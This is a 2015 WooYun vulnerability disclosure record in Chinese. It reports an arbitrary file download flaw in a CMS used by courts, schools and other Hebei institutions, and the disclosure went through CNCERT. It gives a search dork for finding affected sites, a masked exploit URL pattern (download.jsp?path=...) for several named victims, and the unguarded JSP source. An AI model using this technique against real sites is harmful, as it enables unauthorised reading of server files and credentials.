{"id": 70741, "wybug_id": "wooyun-2015-0133745", "wybug_title": "某通用型CMS存在任意文件下载漏洞", "wybug_corp": "石家庄载驰科技", "wybug_author": "日出东方", "wybug_date": "2015-08-15 12:48", "wybug_open_date": "2015-10-01 14:58", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-17：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向公众公开  简要描述： 某通用型CMS存在任意文件下载漏洞乌云搜了搜还没有记录，有没有RMB奖励。。。 详细说明：  石家庄载驰科技存在任意文件下载漏洞。。。   漏洞证明：  google 一下 技术支持：载驰科技\n\n\n\n用户不少。有学校，有法院。。。石家庄新华区人民法院http://**.**.**.**/dynamic/download.jsp?path=/dynamic/download.jsp石家庄美术馆http://**.**.**.**/dynamic/download.jsp?path=/dynamic/download.jsp石家庄教育科学研究所http://**.**.**.**/dynamic/download.jsp?path=/dynamic/download.jsp河北水利网http://**.**.**.**/dynamic/download.jsp?path=/dynamic/download.jsp........这个download.jsp文件内容<%@ include file=\"base.jsp\"%><%\tresponse.setCharacterEncoding(\"ISO-8859-1\");\tApplicationContext ctx = WebApplicationContextUtils.getWebApplicationContext(getServletConfig().getServletContext());\t**.**.**.**mon.util.Properties prop = **.**.**.**mon.util.Properties.getInstance();\tDao dao = (Dao) ctx.getBean(\"dao\");\tString path = request.getParameter(\"path\");\tif(path!=null){\t\tString fname = path.substring(path.lastIndexOf(File.separator) + 1);\t\t**.**.**.**.FileInputStream fs = null;\t\tCmsWeb web = (CmsWeb) dao.getByID(CmsWeb.class, webId);\t\ttry {\t\t\tif (web != null) {\t\t\t\tString filePath = prop.getAppPath() + prop.getText(\"sitedir\") + File.separator + web.getWebPath() + path;\t\t\t\tfs = new **.**.**.**.FileInputStream(new **.**.**.**.File(filePath));\t\t\t}\t\t} catch (**.**.**.**.FileNotFoundException e) {\t\t\te.printStackTrace();\t\t}\t\tresponse.setContentType(\"APPLICATION/x-download\");\t\tresponse.setHeader(\"Content-Disposition\", \"attachment; filename=\\\"\" + fname + \"\\\"\");\t\tint b = 0;\t\ttry {\t\t\t**.**.**.**.PrintWriter out1 = response.getWriter();\t\t\twhile ((b = fs.read()) != -1) {\t\t\t\tout1.write(b);\t\t\t}\t\t\tfs.close();\t\t\tout1.close();\t\t} catch (Exception e) {\t\t\te.printStackTrace();\t\t}\t}%>对下载路径没有限制，导致可以下载任意文件。。对吧。我java 很ja 的   修复方案：  121   版权声明：转载请注明来源 日出东方@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-08-17 14:57 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给河北分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-15 14:39 |    \t\t日出东方 \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:117        )\t\t \n  @cncert国家互联网应急中心 快来呀亲    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}